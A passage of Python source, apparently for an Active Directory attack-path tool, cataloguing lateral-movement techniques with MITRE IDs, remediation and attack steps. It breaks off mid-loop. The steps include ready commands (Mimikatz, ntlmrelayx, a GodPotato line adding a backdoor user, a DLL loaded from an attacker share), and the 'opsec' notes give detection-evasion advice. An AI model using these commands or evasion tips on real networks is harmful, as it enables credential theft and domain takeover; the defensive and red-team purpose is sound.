from __future__ import annotations

import logging
from typing import Any

log = logging.getLogger(__name__)

LM_EDGE_TYPES: frozenset[str] = frozenset({
    "PASS_THE_HASH", "PASS_THE_TICKET", "PASS_THE_CERT", "OVERPASS_THE_HASH",
    "COERCION", "REMOTE_EXEC", "READ_LAPS_PASSWORD", "READ_GMSA_PASSWORD",
    "ADD_KEY_CREDENTIAL_LINK", "S4U2SELF", "GPO_EXEC", "DCOM_EXEC", "WMI_EXEC",
    "SCM_EXEC", "NAMED_PIPE_IMPERSONATE", "SEIMPERSONATE", "RDP_HIJACK",
    "ADCS_RELAY", "PETITPOTAM", "PRINTSPOOLER", "SHADOWCOERCE", "DFSCOERCE",
    "WEBDAV_COERCE", "MSSQL_LINKED", "MSSQL_CLR", "MSSQL_UNC", "SCCM_NAA",
    "AADCONNECT_SYNC", "DNS_ADMIN_EXEC", "ADIDNS_WRITE", "REGISTRY_EXEC",
    "SQL_ADMIN", "NTLM_RELAY", "KERBEROS_RELAY", "POISONING", "GOLDEN_TICKET",
    "MACHINE_ACCOUNT", "ADCS_ESC1", "ADCS_ESC8", "ADCS_ESC15", "NTLM_CAPTURE",
    "ADIDNS_CAN_WRITE", "CVE_CHAIN", "ADMIN_TO", "LOCAL_ADMIN",
})

LM_TECHNIQUE_CATALOGUE: dict[str, dict[str, Any]] = {
    "PTH": {
        "name": "Pass the Hash (PTH)",
        "mitre_id": "T1550.002", "cve": None, "tier": 1,
        "edge_types": {"PASS_THE_HASH"},
        "attack_steps": [
            "Extract NTLM hash from LSASS memory (Mimikatz sekurlsa::logonpasswords)",
            "Use hash directly in SMB authentication (no plaintext needed)",
            "Authenticate to target with: sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>",
            "Access shares, execute remote commands via psexec/wmiexec",
        ],
        "remediation_steps": [
            "Enable Credential Guard to protect LSASS memory",
            "Use Protected Users group for privileged accounts",
            "Restrict NTLM: Network security: Restrict NTLM via GPO",
        ],
        "opsec_notes": "Avoid NTLMv1 — NTLMv2 only. Use wmiexec over psexec (no service creation). Prefer Kerberos auth paths when available.",
    },
    "PTT": {
        "name": "Pass the Ticket (PTT)",
        "mitre_id": "T1550.003", "cve": None, "tier": 1,
        "edge_types": {"PASS_THE_TICKET"},
        "attack_steps": [
            "Steal Kerberos TGT or TGS from LSASS (Mimikatz sekurlsa::tickets /export)",
            "Import ticket into current session: kerberos::ptt <ticket.kirbi>",
            "Use ticket to access target resources without credentials",
        ],
        "remediation_steps": [
            "Enable Credential Guard",
            "Implement Protected Users for tier-0/1 accounts",
            "Set short ticket lifetimes and enforce ticket renewal",
        ],
        "opsec_notes": "TGT injection is more versatile than TGS injection. Use Rubeus for injection — avoids touching LSASS directly (uses /ticket: flag).",
    },
    "PKINIT_CERT": {
        "name": "PKINIT / Pass the Certificate",
        "mitre_id": "T1550.004", "cve": None, "tier": 1,
        "edge_types": {"PASS_THE_CERT"},
        "attack_steps": [
            "Obtain certificate for target account (via ADCS enrollment, shadow credentials, or export)",
            "Use certificate to request TGT via PKINIT: Rubeus asktgt /certificate:<pfx>",
            "Optionally extract NT hash from PKINIT TGT (UnPAC-the-hash)",
            "Use TGT for domain-wide access",
        ],
        "remediation_steps": [
            "Audit certificate enrollment permissions",
            "Monitor for msDS-KeyCredentialLink modifications",
            "Enable CA audit logging for all certificate requests",
        ],
        "opsec_notes": "PKINIT is harder to detect than PTH/PTT. Certificate-based auth generates Event 4768 with cert serial — audit cert issuance.",
    },
    "OVERPASS_THE_HASH": {
        "name": "Overpass the Hash (OPtH)",
        "mitre_id": "T1550.002", "cve": None, "tier": 1,
        "edge_types": {"OVERPASS_THE_HASH"},
        "attack_steps": [
            "Extract NTLM hash from LSASS",
            "Use hash to request Kerberos TGT (avoids NTLM auth entirely)",
            "sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:cmd.exe",
            "All subsequent auth uses Kerberos — avoids NTLM-based detections",
        ],
        "remediation_steps": [
            "Same as PTH remediation — protect LSASS and hash extraction",
            "AES256 pre-auth keys cannot be converted to NTLM — enforce AES",
        ],
        "opsec_notes": "Use AES256 key instead of RC4/NTLM hash for even less detection. Rubeus: asktgt /user:admin /aes256:<key>.",
    },
    "SHADOW_CREDENTIALS_CHAIN": {
        "name": "Shadow Credentials → NT Hash Extraction",
        "mitre_id": "T1558.004", "cve": None, "tier": 1,
        "edge_types": {"ADD_KEY_CREDENTIAL_LINK"},
        "attack_steps": [
            "Write KeyCredential to target account's msDS-KeyCredentialLink (Whisker addcomputer)",
            "Request TGT via PKINIT with the self-signed cert",
            "Use UnPAC-the-hash technique to extract NT hash from PKINIT TGT",
            "Use NT hash for PTH or further lateral movement",
        ],
        "remediation_steps": [
            "Restrict write access to msDS-KeyCredentialLink",
            "Enable LDAP signing + channel binding (CVE-2019-1040 mitigations)",
            "Monitor Event 4742 / 5136 for KeyCredentialLink modifications",
        ],
        "opsec_notes": "LDAP write is relatively quiet. UnPAC-the-hash: Rubeus asktgt then extracting the NT hash from the PAC.",
    },
    "S4U_DELEGATION": {
        "name": "S4U2Self + S4U2Proxy (Constrained Delegation Abuse)",
        "mitre_id": "T1558.001", "cve": None, "tier": 1,
        "edge_types": {"S4U2SELF", "ALLOWED_TO_DELEGATE"},
        "attack_steps": [
            "Identify service account with constrained delegation (msDS-AllowedToDelegateTo)",
            "Use S4U2Self to get TGS on behalf of any user (including DA)",
            "Use S4U2Proxy to get TGS for target service using the S4U2Self ticket",
            "Access target service as impersonated DA-level user",
        ],
        "remediation_steps": [
            "Audit all constrained delegation configurations: Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'}",
            "Prefer Resource-Based Constrained Delegation (RBCD) over classic KCD",
            "Add tier-0 accounts to Protected Users (blocks delegation)",
        ],
        "opsec_notes": "S4U2Self with /impersonateuser:Administrator is very effective. Use Rubeus s4u command chain.",
    },
    "LAPS_PASSWORD_READ": {
        "name": "LAPS Password Read → Local Admin Pivot",
        "mitre_id": "T1552.002", "cve": None, "tier": 1,
        "edge_types": {"READ_LAPS_PASSWORD"},
        "attack_steps": [
            "Identify accounts/groups with ReadProperty on ms-Mcs-AdmPwd attribute",
            "Read LAPS password: Get-ADComputer <target> -Properties ms-Mcs-AdmPwd",
            "Use local admin credential for PTH or direct auth to target machine",
        ],
        "remediation_steps": [
            "Audit ms-Mcs-AdmPwd ReadProperty delegations",
            "Restrict LAPS read to dedicated PAM accounts only",
            "Consider LAPS v2 with encrypted passwords",
        ],
        "opsec_notes": "LAPS password read is a single LDAP query — no network noise to target machine. Combine with PTH for silent lateral movement.",
    },
    "GMSA_PASSWORD_READ": {
        "name": "gMSA Password Read → Service Account Takeover",
        "mitre_id": "T1552.002", "cve": None, "tier": 1,
        "edge_types": {"READ_GMSA_PASSWORD"},
        "attack_steps": [
            "Identify accounts with PrincipalsAllowedToRetrieveManagedPassword on gMSA",
            "Read gMSA NT hash: GMSAPasswordReader or Invoke-GMSAPasswordRead",
            "Use NT hash for PTH as the service account",
        ],
        "remediation_steps": [
            "Audit PrincipalsAllowedToRetrieveManagedPassword delegations",
            "Restrict gMSA retrieval to only the hosts that need it",
        ],
        "opsec_notes": "gMSA passwords rotate automatically (every ~30 days default) but NT hash is stable within that window.",
    },
    "PETITPOTAM_ADCS_ESC8": {
        "name": "PetitPotam → ADCS ESC8 → DA Certificate",
        "mitre_id": "T1557.001", "cve": "CVE-2021-36942", "tier": 1,
        "edge_types": {"PETITPOTAM", "ADCS_RELAY", "ADCS_ESC8"},
        "attack_steps": [
            "Run ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController",
            "Trigger DC to authenticate to relay host via PetitPotam (EfsRpcOpenFileRaw)",
            "ntlmrelayx enrolls DC cert via NTLM relay to ADCS web enrollment",
            "Use DC cert for PKINIT TGT → DCSync as DA",
        ],
        "remediation_steps": [
            "Apply MS patch for CVE-2021-36942 (PetitPotam unauthenticated RPC)",
            "Disable NTLM on CA web enrollment or enable EPA+signing",
            "Enable Extended Protection for Authentication (EPA) on IIS cert enrollment",
        ],
        "opsec_notes": "Relay traffic over port 80 blends with normal HTTP. DC auth via EfsRpc leaves minimal traces. Use impacket ntlmrelayx.",
    },
    "WEBCLIENT_NTLM_RELAY": {
        "name": "WebClient (WebDAV) NTLM Relay → RBCD",
        "mitre_id": "T1557.001", "cve": None, "tier": 1,
        "edge_types": {"WEBDAV_COERCE", "NTLM_RELAY"},
        "attack_steps": [
            "Verify WebClient service running on target (SpoolerScan or CrackMapExec)",
            "Start NTLM relay targeting LDAP: ntlmrelayx -t ldap://<DC> --delegate-access",
            "Coerce target machine auth via WebDAV: responder -I <iface> or UNC path trigger",
            "ntlmrelayx sets RBCD on attacker-controlled machine account",
            "S4U2Self+S4U2Proxy to get TGS as DA → lateral movement",
        ],
        "remediation_steps": [
            "Disable WebClient service on workstations where not needed",
            "Enable LDAP signing and channel binding on DCs",
        ],
        "opsec_notes": "WebDAV coercion uses HTTP port 80 — firewall rules rarely block this. Use Responder carefully to avoid poisoning everything.",
    },
    "DFSCOERCE_RELAY": {
        "name": "DFSCoerce NTLM Coercion",
        "mitre_id": "T1557.001", "cve": None, "tier": 2,
        "edge_types": {"DFSCOERCE"},
        "attack_steps": [
            "Use DFSCoerce tool to trigger NetrDfsRemoveStdRoot via MS-DFSNM",
            "DC or server authenticates to attacker-controlled NTLM relay",
            "Relay to LDAP/LDAPS for RBCD or other attacks",
        ],
        "remediation_steps": [
            "Block RPC coercion via firewall (restrict SMB to trusted subnets)",
            "Enable LDAP signing + channel binding",
        ],
        "opsec_notes": "DFSCoerce uses SMB — ensure relay listener is on different IP than coercion source.",
    },
    "SHADOWCOERCE_RELAY": {
        "name": "ShadowCoerce VSS NTLM Coercion",
        "mitre_id": "T1557.001", "cve": None, "tier": 2,
        "edge_types": {"SHADOWCOERCE"},
        "attack_steps": [
            "Use ShadowCoerce to trigger VSS (Volume Shadow Copy Service) auth via MS-FSRVP",
            "DC authenticates to relay host",
            "Relay to LDAPS for RBCD or cert enrollment attack",
        ],
        "remediation_steps": [
            "Disable File Server VSS Agent Service on DCs if not needed",
            "Apply coercion mitigation patches",
        ],
        "opsec_notes": "MS-FSRVP coercion is quieter than SpoolSS. Requires File Server role on target.",
    },
    "PRINTSPOOLER_COERCE": {
        "name": "PrintSpooler (SpoolSS) Coercion",
        "mitre_id": "T1557.001", "cve": "CVE-2021-34527", "tier": 2,
        "edge_types": {"PRINTSPOOLER"},
        "attack_steps": [
            "Use SpoolSample or printerbug.py to coerce Print Spooler RPC auth",
            "DC or server authenticates to attacker relay",
            "Relay to LDAP for RBCD, S4U2Proxy chain",
        ],
        "remediation_steps": [
            "Disable Print Spooler service on all DCs",
            "Apply PrintNightmare patches (KB5004945 and related)",
        ],
        "opsec_notes": "SpoolSS is well-monitored — use EfsRpc/DFSCoerce for stealthier coercion.",
    },
    "NOPAC": {
        "name": "noPac (sAMAccountName Spoofing)",
        "mitre_id": "T1558.001", "cve": "CVE-2021-42278 / CVE-2021-42287", "tier": 2,
        "edge_types": {"CVE_CHAIN", "MACHINE_ACCOUNT"},
        "attack_steps": [
            "Create machine account with MachineAccountQuota (default: 10 per user)",
            "Set machine sAMAccountName to DC name (without $)",
            "Request TGT for the machine account — KDC adds $ internally",
            "Request TGS using old TGT — KDC finds no account, appends $, impersonates DC",
            "Use impersonated DC TGS for DCSync",
        ],
        "remediation_steps": [
            "Apply November 2021 security updates (CVE-2021-42278 + CVE-2021-42287)",
            "Set MachineAccountQuota to 0 for all non-admin users",
        ],
        "opsec_notes": "Works only on unpatched DCs. Use noPac.py (cube0x0). Generates distinctive Event 4741 (machine account created).",
    },
    "CERTIFRIED": {
        "name": "Certifried (CVE-2022-26923) — Machine Cert Privilege Escalation",
        "mitre_id": "T1649", "cve": "CVE-2022-26923", "tier": 2,
        "edge_types": {"CVE_CHAIN", "ADCS_ESC15"},
        "attack_steps": [
            "Create machine account or modify dNSHostName to match DC name",
            "Request certificate using Machine template with spoofed dNSHostName",
            "Use cert for PKINIT as DC account → DCSync",
        ],
        "remediation_steps": [
            "Apply May 2022 security update (KB5014745)",
            "Restrict machine account creation and dNSHostName modification",
        ],
        "opsec_notes": "Only works on unpatched environments. Requires machine account creation or modification rights.",
    },
    "KRBRELAYUP": {
        "name": "KrbRelayUp — Local Privilege Escalation via Kerberos Relay",
        "mitre_id": "T1558", "cve": None, "tier": 2,
        "edge_types": {"KERBEROS_RELAY", "MACHINE_ACCOUNT"},
        "attack_steps": [
            "Create machine account (requires default MachineAccountQuota > 0)",
            "Relay Kerberos authentication from unprivileged user to LDAP",
            "Set RBCD on newly created machine account",
            "S4U2Self+S4U2Proxy to gain SYSTEM on local machine",
            "Repeat to pivot laterally",
        ],
        "remediation_steps": [
            "Set MachineAccountQuota to 0",
            "Enable LDAP signing + channel binding",
            "Apply patches blocking Kerberos relay (MS-RPRN, MS-EFSR mitigations)",
        ],
        "opsec_notes": "Local attack that escalates to SYSTEM without touching LSASS. Combines well with domain-joined low-priv shell.",
    },
    "AADCONNECT_PWSYNC": {
        "name": "AADConnect Password Sync Credential Extraction",
        "mitre_id": "T1003.006", "cve": None, "tier": 2,
        "edge_types": {"AADCONNECT_SYNC"},
        "attack_steps": [
            "Identify AADConnect server in environment",
            "Extract AADConnect service account credentials from registry/config",
            "Use AADConnect's MSOL_ account (has DCSync rights) to dump AD hashes",
            "Alternatively extract cloud user credentials from AADConnect sync cache",
        ],
        "remediation_steps": [
            "Harden AADConnect server with equivalent tier-0 controls",
            "Monitor MSOL_ account for DCSync-like LDAP queries (Event 4662)",
            "Use Managed Identity for AADConnect instead of service accounts where possible",
        ],
        "opsec_notes": "MSOL_ account DCSync is legitimate — blend with normal sync traffic. Time operations to coincide with sync cycles.",
    },
    "MSSQL_LINKED_SERVER": {
        "name": "MSSQL Linked Server Lateral Movement",
        "mitre_id": "T1210", "cve": None, "tier": 2,
        "edge_types": {"MSSQL_LINKED"},
        "attack_steps": [
            "Enumerate linked servers: SELECT * FROM sys.servers WHERE is_linked = 1",
            "Pivot via: EXECUTE('xp_cmdshell ''whoami''') AT [linked_server]",
            "Chain multiple linked servers to reach target systems",
            "Extract credentials from SQL Server service account context",
        ],
        "remediation_steps": [
            "Disable linked servers or restrict to minimum required",
            "Disable xp_cmdshell on all SQL Server instances",
            "Use least-privilege service accounts for SQL Server",
        ],
        "opsec_notes": "xp_cmdshell leaves traces in SQL error log and Windows Event Log. Consider sp_OACreate alternative.",
    },
    "MSSQL_CLR_EXEC": {
        "name": "MSSQL CLR Assembly Code Execution",
        "mitre_id": "T1059", "cve": None, "tier": 2,
        "edge_types": {"MSSQL_CLR"},
        "attack_steps": [
            "Enable CLR: sp_configure 'clr enabled', 1; RECONFIGURE",
            "Create CLR assembly with OS execution capability",
            "Deploy and execute: CREATE ASSEMBLY ... FROM 0x<hex>",
            "Run system commands through CLR stored procedure",
        ],
        "remediation_steps": [
            "Disable CLR integration unless required",
            "Use TRUSTWORTHY OFF and code signing for CLR assemblies",
            "Monitor sp_configure changes and CLR assembly creation",
        ],
        "opsec_notes": "CLR exec is stealthier than xp_cmdshell. PowerUpSQL has built-in CLR exec modules.",
    },
    "SCCM_NAA_EXTRACTION": {
        "name": "SCCM NAA Credential Extraction",
        "mitre_id": "T1552.001", "cve": None, "tier": 2,
        "edge_types": {"SCCM_NAA"},
        "attack_steps": [
            "Identify SCCM Network Access Account (NAA) configuration",
            "Extract NAA credentials from SCCM client WMI namespace or DPAPI blobs",
            "Retrieve from: root\\ccm\\Policy\\Machine\\ActualConfig via WMI",
            "Decrypt using DPAPI with SYSTEM context or offline with machine key",
        ],
        "remediation_steps": [
            "Use SCCM enhanced HTTP instead of NAA where possible",
            "Restrict NAA permissions to minimum required (no DA rights)",
            "Audit all SCCM NAA configurations regularly",
        ],
        "opsec_notes": "WMI query is silent. Extraction requires SYSTEM context on SCCM client machine.",
    },
    "ADCS_ESC1_CERT_ABUSE": {
        "name": "ADCS ESC1 — Enrollee Supplies Subject (UPN Override)",
        "mitre_id": "T1649", "cve": None, "tier": 1,
        "edge_types": {"ADCS_ESC1"},
        "attack_steps": [
            "Find templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and low enrollment rights",
            "Enroll certificate with SAN: -SubjectAltName upn:Administrator@domain.com",
            "Use certificate for PKINIT TGT as Administrator",
        ],
        "remediation_steps": [
            "Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from non-administrative templates",
            "Require CA manager approval for sensitive templates",
            "Enable EDITF_ATTRIBUTESUBJECTALTNAME2 only when strictly required",
        ],
        "opsec_notes": "certreq.exe enrollment blends with PKI traffic. Use --template flag in Certipy.",
    },
    "ADCS_ESC6_ALTNAME": {
        "name": "ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag",
        "mitre_id": "T1649", "cve": None, "tier": 2,
        "edge_types": {"ADCS_RELAY"},
        "attack_steps": [
            "Verify CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set (certutil -config <CA> -getreg policy\\EditFlags)",
            "Any template that allows enrollment can now specify SAN",
            "Enroll with any non-privileged template, specifying admin UPN as SAN",
            "Use certificate for PKINIT TGT as target account",
        ],
        "remediation_steps": [
            "Clear EDITF_ATTRIBUTESUBJECTALTNAME2 flag from all CAs",
            "Use template-level SAN restriction instead",
        ],
        "opsec_notes": "CA-level flag affects all templates — broader attack surface than ESC1.",
    },
    "ADCS_ESC7_OFFICER": {
        "name": "ADCS ESC7 — CA Officer/Manager Privilege Abuse",
        "mitre_id": "T1649", "cve": None, "tier": 2,
        "edge_types": {"ADCS_RELAY"},
        "attack_steps": [
            "Compromise CA Officer or CA Manager account",
            "Use CA Officer rights to approve pending certificate requests",
            "Issue certificate for any SAN/UPN using manager approval bypass",
        ],
        "remediation_steps": [
            "Treat CA Officer/Manager accounts as tier-0",
            "Enable dual-control for certificate issuance",
        ],
        "opsec_notes": "CA certificate approval is a legitimate operation — low detection surface.",
    },
    "ADCS_ESC8_RELAY": {
        "name": "ADCS ESC8 — NTLM Relay to AD CS Web Enrollment",
        "mitre_id": "T1557.001", "cve": None, "tier": 1,
        "edge_types": {"ADCS_RELAY", "ADCS_ESC8", "NTLM_RELAY"},
        "attack_steps": [
            "Set up NTLM relay: ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController",
            "Coerce target machine auth via SpoolSS/PetitPotam/DFSCoerce",
            "NTLM relay enrolls certificate on behalf of coerced machine",
            "Use certificate for PKINIT as the machine account",
        ],
        "remediation_steps": [
            "Enable Extended Protection for Authentication (EPA) on certificate web enrollment",
            "Enforce HTTPS on certsrv and require client auth",
            "Disable HTTP-based enrollment",
        ],
        "opsec_notes": "ntlmrelayx with --adcs flag handles encoding. Combine with any coercion primitive.",
    },
    "ADCS_ESC9_NOUPDATE": {
        "name": "ADCS ESC9 — No Security Extension on Template",
        "mitre_id": "T1649", "cve": None, "tier": 2,
        "edge_types": {"ADCS_ESC1"},
        "attack_steps": [
            "Find templates with CT_FLAG_NO_SECURITY_EXTENSION set",
            "Modify userPrincipalName on source account to match target",
            "Enroll certificate — no security extension means no UPN binding check",
            "Revert UPN change, use certificate as original target account",
        ],
        "remediation_steps": [
            "Remove CT_FLAG_NO_SECURITY_EXTENSION from all templates",
            "Monitor UPN attribute changes (Event 5136)",
        ],
        "opsec_notes": "UPN modification is auditable — work quickly and revert.",
    },
    "ADCS_ESC10_WEAKBIND": {
        "name": "ADCS ESC10 — Weak Certificate Binding (StrongCertificateBindingEnforcement)",
        "mitre_id": "T1649", "cve": "CVE-2022-26923", "tier": 2,
        "edge_types": {"ADCS_ESC15"},
        "attack_steps": [
            "Check registry: StrongCertificateBindingEnforcement = 0 or 1 (compatibility mode)",
            "Obtain any certificate for a machine account",
            "Use certificate to authenticate as that machine — weak binding accepted",
        ],
        "remediation_steps": [
            "Set StrongCertificateBindingEnforcement = 2 (full enforcement mode)",
            "Apply May 2022 Kerberos updates",
        ],
        "opsec_notes": "Compatibility mode (value=1) allows attack. Enforcement mode (value=2) blocks it.",
    },
    "ADCS_ESC11_ICPR": {
        "name": "ADCS ESC11 — NTLM Relay to ICPR (MS-ICPR RPC)",
        "mitre_id": "T1557.001", "cve": None, "tier": 3,
        "edge_types": {"ADCS_RELAY", "NTLM_RELAY"},
        "attack_steps": [
            "Set up NTLM relay targeting ICPR (MS-ICPR RPC endpoint on CA)",
            "Coerce machine authentication",
            "Relay to ICPR instead of HTTP certsrv — bypasses EPA on HTTP",
            "Enroll certificate via RPC relay",
        ],
        "remediation_steps": [
            "Apply patch that adds EPA to ICPR endpoint",
            "Require SSL for RPC-based certificate enrollment",
        ],
        "opsec_notes": "ESC11 bypasses EPA mitigations that stop ESC8. Use impacket certipy fork.",
    },
    "ADCS_ESC13_OID": {
        "name": "ADCS ESC13 — OID Group Link Privilege Escalation",
        "mitre_id": "T1649", "cve": None, "tier": 3,
        "edge_types": {"ADCS_ESC1"},
        "attack_steps": [
            "Find template linked to an OID with msDS-OIDToGroupLink pointing to privileged group",
            "Enroll certificate using that template",
            "Certificate grants group membership equivalent during Kerberos auth",
        ],
        "remediation_steps": [
            "Audit msDS-OIDToGroupLink associations on all OID objects",
            "Restrict enrollment on templates with OID group links",
        ],
        "opsec_notes": "Very stealthy — group membership from certificate is not visible in standard AD tools.",
    },
    "HIVENIGHTMARE": {
        "name": "HiveNightmare / SeriousSAM (SAM/SYSTEM Shadow Copy Read)",
        "mitre_id": "T1003.002", "cve": "CVE-2021-36934", "tier": 2,
        "edge_types": {"CVE_CHAIN"},
        "attack_steps": [
            "Check VSS shadow copy permissions on SAM/SYSTEM hives (icacls C:\\Windows\\System32\\config\\SAM)",
            "If ACL allows user read: copy SAM hive from shadow copy",
            "Extract local credentials: secretsdump.py -sam SAM -system SYSTEM LOCAL",
            "Use local admin hash for PTH to other domain-joined machines",
        ],
        "remediation_steps": [
            "Apply KB5005010 and related patches",
            "Remove Volume Shadow Copies if not needed, or restrict permissions",
        ],
        "opsec_notes": "File read of VSS shadow — no process injection or privilege escalation needed. Works from any non-admin user.",
    },
    "PRINTNIGHTMARE_LPE": {
        "name": "PrintNightmare Local Privilege Escalation",
        "mitre_id": "T1068", "cve": "CVE-2021-34527", "tier": 2,
        "edge_types": {"PRINTSPOOLER"},
        "attack_steps": [
            "Verify Print Spooler service running (Get-Service -Name Spooler)",
            "Use AddPrinterDriver RPC to load malicious DLL as SYSTEM",
            "DLL drops privileged shell or adds user to local admins",
        ],
        "remediation_steps": [
            "Disable Print Spooler on all non-print servers",
            "Apply KB5004945 (PrintNightmare patch)",
        ],
        "opsec_notes": "Spooler DLL load is logged in Event 7045 (service install). Use memory-only DLL if possible.",
    },
    "SEIMPERSONATE_GODPOTATO": {
        "name": "SeImpersonatePrivilege → GodPotato / RoguePotato",
        "mitre_id": "T1134.001", "cve": None, "tier": 2,
        "edge_types": {"SEIMPERSONATE", "NAMED_PIPE_IMPERSONATE"},
        "attack_steps": [
            "Verify SeImpersonatePrivilege (whoami /priv)",
            "Use GodPotato: GodPotato.exe -cmd 'net user backdoor P@ssw0rd /add'",
            "Alternatively: RoguePotato or PrintSpoofer for SYSTEM impersonation",
            "Escalate to SYSTEM, then lateral movement with machine credentials",
        ],
        "remediation_steps": [
            "Restrict SeImpersonatePrivilege to only required service accounts",
            "Use Windows Server containers to isolate IIS/SQL processes",
        ],
        "opsec_notes": "GodPotato is process-based — avoid writing to disk. Use reflective loading.",
    },
    "GPO_EXEC": {
        "name": "GPO Modification for Code Execution",
        "mitre_id": "T1484.001", "cve": None, "tier": 1,
        "edge_types": {"GPO_EXEC", "APPLIES_GPO"},
        "attack_steps": [
            "Identify GPO with write access (SharpGPOAbuse or BloodHound GPO edges)",
            "Add scheduled task or startup script to GPO via LDAP or file system",
            "GPO applies to machines in OU — code executes on next policy refresh",
            "Use to achieve persistence or lateral movement to all machines in scope",
        ],
        "remediation_steps": [
            "Audit GPO write permissions: Get-GPPermissions -All | Where ModifyPermissions",
            "Restrict GPO modification to dedicated AD admin accounts only",
        ],
        "opsec_notes": "GPO changes replicate over SYSVOL — detectable via file system monitoring. Set gpupdate /force to speed up execution.",
    },
    "DNS_ADMIN_DLL": {
        "name": "DNSAdmin DLL Injection via DNS Service",
        "mitre_id": "T1574.002", "cve": None, "tier": 2,
        "edge_types": {"DNS_ADMIN_EXEC"},
        "attack_steps": [
            "Compromise account in DnsAdmins group",
            "Set malicious DLL path: dnscmd /config /serverlevelplugindll \\\\attacker\\share\\evil.dll",
            "Restart DNS service: sc stop dns; sc start dns",
            "DLL loads in DNS service context (SYSTEM or NETWORK SERVICE)",
        ],
        "remediation_steps": [
            "Remove non-essential accounts from DnsAdmins group",
            "Block outbound SMB from DCs to prevent UNC DLL loading",
            "Monitor serverlevelplugindll registry changes",
        ],
        "opsec_notes": "DNS service restart is logged (Event 7036). Consider loading DLL from local path instead of UNC.",
    },
    "ADIDNS_RELAY_SETUP": {
        "name": "ADIDNS Record Injection for Relay/Poisoning",
        "mitre_id": "T1557.001", "cve": None, "tier": 2,
        "edge_types": {"ADIDNS_WRITE", "ADIDNS_CAN_WRITE"},
        "attack_steps": [
            "Verify write access to ADIDNS zone (default: any authenticated user)",
            "Add wildcard DNS record pointing to attacker: Invoke-DNSUpdate -DNSName '*' -DNSData <attacker IP>",
            "Machines resolving unconfigured names get attacker IP",
            "Capture NTLM auth via Responder or relay to LDAP/SMB",
        ],
        "remediation_steps": [
            "Disable authenticated user write on ADIDNS zones",
            "Use dnscmd /Config /OpenACLOnProxyUpdates 0 to restrict DNS updates",
            "Monitor for wildcard DNS record creation",
        ],
        "opsec_notes": "DNS record injection is detectable via DNS audit logs. Target specific hostnames rather than wildcards to reduce footprint.",
    },
    "WMI_EXEC": {
        "name": "WMI Remote Code Execution",
        "mitre_id": "T1047", "cve": None, "tier": 1,
        "edge_types": {"WMI_EXEC"},
        "attack_steps": [
            "Use wmiexec.py or Invoke-WMIMethod for remote exec",
            "Execute via Win32_Process::Create (spawns child of WmiPrvSE.exe)",
            "Alternatively use wmic /node:<target> process call create '<cmd>'",
        ],
        "remediation_steps": [
            "Restrict WMI access via DCOM permissions",
            "Monitor WMI activity via WMI subscription events",
        ],
        "opsec_notes": "WMI spawns from WmiPrvSE — avoid anomalous child process names. Use --nooutput for file-less operation.",
    },
    "DCOM_EXEC": {
        "name": "DCOM Remote Code Execution",
        "mitre_id": "T1021.003", "cve": None, "tier": 1,
        "edge_types": {"DCOM_EXEC"},
        "attack_steps": [
            "Use MMC20.Application, ShellWindows, or ShellBrowserWindow DCOM objects",
            "Invoke ExecuteShellCommand or Navigate2 for RCE",
            "dcomexec.py from impacket for automated DCOM lateral movement",
        ],
        "remediation_steps": [
            "Restrict DCOM permissions to admins only",
            "Block lateral DCOM via firewall (TCP 135 + dynamic RPC ports)",
        ],
        "opsec_notes": "MMC20.Application spawns from mmc.exe — less suspicious than cmd. Avoid ShellWindows on patched Win10+.",
    },
    "SCM_EXEC": {
        "name": "Service Control Manager Remote Service Creation",
        "mitre_id": "T1021.002", "cve": None, "tier": 1,
        "edge_types": {"SCM_EXEC"},
        "attack_steps": [
            "Use psexec.py or smbexec.py for SCM-based remote exec",
            "Create service via OpenSCManagerW → CreateServiceW → StartServiceW",
            "Service runs as SYSTEM",
        ],
        "remediation_steps": [
            "Restrict remote service creation (Group Policy: Network access: Restrict clients allowed to make remote calls to SAM)",
            "Disable admin shares where not required (ADMIN$, C$)",
        ],
        "opsec_notes": "SCM service creation is logged (Event 7045). Use smbexec (no binary drop) over psexec when possible.",
    },
    "RDP_HIJACK": {
        "name": "RDP Session Hijacking (tscon)",
        "mitre_id": "T1563.002", "cve": None, "tier": 2,
        "edge_types": {"RDP_HIJACK"},
        "attack_steps": [
            "Gain SYSTEM context on target RDP server",
            "List sessions: query session",
            "Hijack disconnected session: tscon <SessionID> /dest:console",
            "Access session without knowing the user's password",
        ],
        "remediation_steps": [
            "Enforce RDP NLA (Network Level Authentication)",
            "Disconnect idle sessions automatically via GPO",
            "Monitor for tscon.exe execution (Event 4624 type 10 anomalies)",
        ],
        "opsec_notes": "tscon.exe use is rarely monitored. Requires SYSTEM or SeDebugPrivilege. Works on Windows Server 2008+.",
    },
    "REGISTRY_EXEC": {
        "name": "Registry Run Key / Scheduled Task Persistence + Exec",
        "mitre_id": "T1547.001", "cve": None, "tier": 2,
        "edge_types": {"REGISTRY_EXEC"},
        "attack_steps": [
            "Identify remote registry write access (requires WINREG named pipe)",
            "Add run key or startup entry via remote registry",
            "Execute on next user logon or system startup",
        ],
        "remediation_steps": [
            "Disable Remote Registry service on endpoints",
            "Monitor registry run key modifications (Sysmon Event ID 13)",
        ],
        "opsec_notes": "Remote registry requires admin rights. Run key persistence survives reboots — good for maintaining foothold.",
    },
    "POISONING_LLMNR": {
        "name": "LLMNR/NBT-NS Poisoning for NTLM Capture",
        "mitre_id": "T1557.001", "cve": None, "tier": 1,
        "edge_types": {"POISONING", "NTLM_CAPTURE"},
        "attack_steps": [
            "Run Responder on network segment: responder -I eth0 -wrf",
            "Wait for LLMNR/NBT-NS broadcast queries for non-existent names",
            "Responder responds with attacker IP → victim sends NTLM auth",
            "Crack NTLMv2 hash (hashcat -m 5600) or relay to target",
        ],
        "remediation_steps": [
            "Disable LLMNR and NBT-NS via GPO",
            "Enable SMB signing to prevent relay attacks",
        ],
        "opsec_notes": "Responder poisoning is very noisy to network IDS. Use targeted relay (ntlmrelayx) over Responder cracking for stealth.",
    },
}

_EDGE_TO_TECHNIQUE: dict[str, list[str]] = {}
for _tid, _tdata in LM_TECHNIQUE_CATALOGUE.items():
    for _et in _tdata.get("edge_types", set()):
